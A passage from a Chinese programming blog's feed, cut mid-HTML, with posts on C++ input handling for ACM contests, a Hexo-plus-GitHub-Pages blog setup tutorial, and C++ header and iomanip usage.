class="hljs-built_in">string</span> s;<br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span><br>abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span><br>    <span class="hljs-comment">//这输出的是一句空字符串，没有任何的输出</span><br></code></pre></div></td></tr></table></figure><p>正确的输入方式：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cin</span>.get(); <span class="hljs-comment">//不能用getchar()函数</span><br><span class="hljs-built_in">string</span> s;<br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">25</span><br>abcd<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">25</span><br>abcd<br></code></pre></div></td></tr></table></figure><p><strong>也可以定义两个string来实现</strong></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-built_in">cout</span>&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">string</span> s,c;<br>getline(<span class="hljs-built_in">cin</span>,c); <span class="hljs-comment">//用来吃掉n后面的回车</span><br>getline(<span class="hljs-built_in">cin</span>,s);<br><span class="hljs-built_in">cout</span>&lt;&lt;c&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">5</span><br>sfje few fwa<br><span class="hljs-comment">//输出</span><br>                 <span class="hljs-comment">//这是一个回车，即字符串c</span><br>sfje few fwa<br></code></pre></div></td></tr></table></figure><h1 id="二-输入二维字符数组"><a href="#二-输入二维字符数组" class="headerlink" title="二.输入二维字符数组"></a>二.输入二维字符数组</h1><h3 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h3><p>代码一，用%s输入：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn]; <span class="hljs-comment">//m行n列的二维字符数组</span><br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,&amp;a[i]);<br><span class="hljs-comment">//getchar(); //这里的getchar()函数有无不影响最后的输出结果。需要与%c的方式输入时区别开</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i][j]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><p>代码实现二，用%c输入：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,&amp;a[i][j]);<br>&#125;<br>getchar();<span class="hljs-comment">//这里的getchar()函数必须写，不然会出错。</span><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i][j]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><h3 id="C-实现"><a href="#C-实现" class="headerlink" title="C++实现"></a>C++实现</h3><p>代码实现一：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br> <span class="hljs-built_in">cin</span>&gt;&gt;a[i][j]; <span class="hljs-comment">//这里并没有使用getchar()之类的函数</span><br>&#125;<br>&#125;<br><br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;a[i][j];<br>&#125;<br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><p>代码实现二：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span> a[minn][minn];<br><span class="hljs-keyword">int</span> n,m;<br><span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-built_in">cin</span>&gt;&gt;a[i];<br>&#125;<br><br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;++i)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;++j)&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;a[i][j];<br>&#125;<br> <span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//输入</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br><span class="hljs-comment">//输出</span><br><span class="hljs-number">6</span> <span class="hljs-number">9</span><br>....#.<br>.....#<br>......<br>......<br>......<br>......<br>......<br>#@...#<br>.#..#.<br></code></pre></div></td></tr></table></figure><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo-Fluid主题-搭建个人博客</title>
    <link href="/2021/04/07/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/04/07/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/zh-cn/">hexo官网</a>进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p><h1 id="Hexo搭建步骤"><a href="#Hexo搭建步骤" class="headerlink" title="Hexo搭建步骤"></a>Hexo搭建步骤</h1><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h3><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。Git非常强大.</p><p>windows：到git官网上下载,<a href="https://gitforwindows.org/">Download git</a>,下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。</p><p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install git<br></code></pre></div></td></tr></table></figure><p>安装好后，用  git –version 来查看一下版本</p><h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h3><p>windows：<a href="https://nodejs.org/en/download/">nodejs</a>选择LTS版本就行了。<br>linux:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get install nodejs<br>sudo apt-get install npm<br></code></pre></div></td></tr></table></figure><p>安装完后，检查有没有安装成功</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></div></td></tr></table></figure><h3 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h3><p>可以先创建一个文件夹blog，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接 右键 -&gt; git bash 打开 ）。<br>然后输入命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">npm install -g hexo-cli<br></code></pre></div></td></tr></table></figure><p>可以用 hexo -v 查看一下版本</p><h4 id="3-1初始化hexo"><a href="#3-1初始化hexo" class="headerlink" title="3.1初始化hexo"></a>3.1初始化hexo</h4><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo init myblog //myblog为文件夹名字，可以任意取<br><span class="hljs-built_in">cd</span> myblog //进入这个myblog文件夹<br>npm install<br></code></pre></div></td></tr></table></figure><p>之后，我文件夹中就会多一些文件夹</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li> themes：主题</li><li> _config.yml: 博客的配置文件</li></ul><p>然后再输入命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo g<br>hexo server  //hexo s<br></code></pre></div></td></tr></table></figure><p>再在浏览器输入 localhost:4000 就可以在本地看到你生成的博客了。此时不能关闭 git ，否则将无法在本地看见。也可以在 git 中输入  ctrl+c 来停止本地浏览。</p><h3 id="4-GitHub创建个人仓库"><a href="#4-GitHub创建个人仓库" class="headerlink" title="4.GitHub创建个人仓库"></a>4.GitHub创建个人仓库</h3><p>正常注册即可。</p><p>登录后，在GitHub.com中看到一个New repository，</p><p><img src="https://img-blog.csdnimg.cn/20210407201550136.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/20210407201632462.png" alt="2"></p><p>点击 new 新建一个，</p><p>创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名。我这里是已经建过了。填写好之后就可以 create repository 。</p><p><img src="https://img-blog.csdnimg.cn/20210407201651528.png" alt="3"></p><h3 id="5-生成SSH添加到GitHub"><a href="#5-生成SSH添加到GitHub" class="headerlink" title="5.生成SSH添加到GitHub"></a>5.生成SSH添加到GitHub</h3><p>在git bash中，输入命令，</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;yourname&quot;</span><br>git config --global user.email <span class="hljs-string">&quot;youremail&quot;</span><br>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能对应账户。<br></code></pre></div></td></tr></table></figure><p>也可以检查一下你是否输入正确</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git config user.name<br>git config user.email<br>可以看是否是你输入的名称和邮箱。<br></code></pre></div></td></tr></table></figure><p>然后创建SSH,一路回车</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail&quot;</span><br>这个时候它会告诉你已经生成了.ssh的文件夹。根据提示，在你的电脑中找到这个文件夹。<br>其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。<br></code></pre></div></td></tr></table></figure><p>然后在GitHub的 setting 中，找到SSH keys的设置选项，点击New SSH key<br>把你的id_rsa.pub里面的信息复制进去即可。</p><p><img src="https://img-blog.csdnimg.cn/20210407201710573.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/20210407201728580.png" alt="5"><br><img src="https://img-blog.csdnimg.cn/20210407201747105.png" alt="6"><br><img src="https://img-blog.csdnimg.cn/20210407201804137.png" alt="7"></p><p>title 可以随便填。</p><p>也可以查看是否成功</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh -T git@github.com<br></code></pre></div></td></tr></table></figure><h3 id="6-将hexo部署到GitHub"><a href="#6-将hexo部署到GitHub" class="headerlink" title="6.将hexo部署到GitHub"></a>6.将hexo部署到GitHub</h3><p>将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 <code>_config.yml</code>，翻到最后，其中，YourgithubName就是你的GitHub账户名称</p><p>修改为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">deploy:<br>  <span class="hljs-built_in">type</span>: git<br>  repo: https://github.com/YourgithubName/YourgithubName.github.io.git<br>  branch: master<br></code></pre></div></td></tr></table></figure><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">npm install hexo-deployer-git --save<br></code></pre></div></td></tr></table></figure><p>然后</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">hexo clean<br>hexo generate <span class="hljs-comment">//hexo g</span><br>hexo deploy <span class="hljs-comment">//hexo d</span><br></code></pre></div></td></tr></table></figure><p>注意</p><p>hexo d 时可能要你输入username和password。</p><p>过一会儿就可以在<code>http://yourname.github.io</code> 这个网站看到你的博客了！！</p><p>以后，每当修改了内容，都可以用</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo g<br>hexo d<br></code></pre></div></td></tr></table></figure><p>去更新GitHub，也可以先用hexo clean 进行清除，再用上面两个。</p><h3 id="7-设置个人域名"><a href="#7-设置个人域名" class="headerlink" title="7.设置个人域名"></a>7.设置个人域名</h3><p>再购买了域名后，进入解析，添加解析。选择 A记录 即可。</p><p>其中，192.30.252.153 和 192.30.252.154 是GitHub的服务器地址。选择其一即可。</p><p>你也可以自己ping 自己的博客</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ping XXXX.github.io<br></code></pre></div></td></tr></table></figure><p>显示出来的就是GitHub服务器的地址。也可以直接用给出的，都是一样的效果。</p><p>在域名解析完成后，再登录GitHub，进入之前创建的仓库，</p><p>在你的仓库中创建一个名为CNAME文件，不要www或者hppt之类的。直接写上你的域名。如：abcdef.com</p><p>过不了多久，再打开你的浏览器，输入你自己的域名，就可以看到搭建的网站啦！</p><hr><h1 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h1><p>在文件根目录下的<code>_config.yml</code>，就是整个hexo框架的配置文件了。</p><h3 id="1-更换主题"><a href="#1-更换主题" class="headerlink" title="1.更换主题"></a>1.更换主题</h3><p>持续更新中······</p>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-实用C++自带算法函数及其用法</title>
    <link href="/2021/04/07/ACM/ACM-%E5%AE%9E%E7%94%A8C++%E8%87%AA%E5%B8%A6%E7%AE%97%E6%B3%95%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95/"/>
    <url>/2021/04/07/ACM/ACM-%E5%AE%9E%E7%94%A8C++%E8%87%AA%E5%B8%A6%E7%AE%97%E6%B3%95%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>记录一些ACM中可能会用到的一些C++自带函数，记录其函数和具体用法。</p><h1 id="一-头文件"><a href="#一-头文件" class="headerlink" title="一. 头文件"></a>一. 头文件</h1><h2 id="1-主要算法头文件"><a href="#1-主要算法头文件" class="headerlink" title="1. 主要算法头文件"></a>1. 主要算法头文件</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;bit/stdc++.h&gt; //万能头文件，包含了目前c++所包含的所有头文件。可替换所有头文件。但有部分编译器不可用。</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;algorithm&gt; //包括很多常用函数</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;numeric&gt; //只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;functional&gt; //定义了一些模板类，用以声明函数对象。</span></span><br></code></pre></div></td></tr></table></figure><h2 id="2-一些其他常用头文件"><a href="#2-一些其他常用头文件" class="headerlink" title="2. 一些其他常用头文件"></a>2. 一些其他常用头文件</h2><h3 id="include-lt-iomanip-gt-头文件"><a href="#include-lt-iomanip-gt-头文件" class="headerlink" title="#include&lt; iomanip&gt;头文件"></a>#include&lt; iomanip&gt;头文件</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iomanip&gt;</span></span><br><span class="hljs-number">1.</span>控制输出小数点位数(根据保留位数的后一位按照四舍五入舍留)<br>例：输出保留小数点后<span class="hljs-number">3</span>位<br><span class="hljs-keyword">double</span> n=<span class="hljs-number">23.15655</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//23.157</span><br><span class="hljs-keyword">double</span> n=<span class="hljs-number">23.15645</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//23.156</span><br><span class="hljs-comment">//注：以后除特别说明外，所有的输出都是一对一。即若有多个输出，则需要多次书写相同的格式。如</span><br><span class="hljs-built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;n&lt;&lt;fixed&lt;&lt;setprecision(<span class="hljs-number">3</span>)&lt;&lt;m&lt;&lt;<span class="hljs-built_in">endl</span>;<br><br><span class="hljs-number">2.</span>设置字段宽度(空格加数字总共占几个宽度)<br>setw(<span class="hljs-keyword">int</span> n);<br>例：输出数字，并设置宽度分别<span class="hljs-number">1</span>、<span class="hljs-number">3</span>、<span class="hljs-number">5</span><br><span class="hljs-keyword">int</span> n=<span class="hljs-number">7</span>;<br><span class="hljs-built_in">cout</span>&lt;&lt;setw(<span class="hljs-number">1</span>)&lt;&lt;n&lt;&lt;<span class="hljs-built_in">endl</span>; <span class="hljs-comment">//7 数字前面没有空格</span><br><span 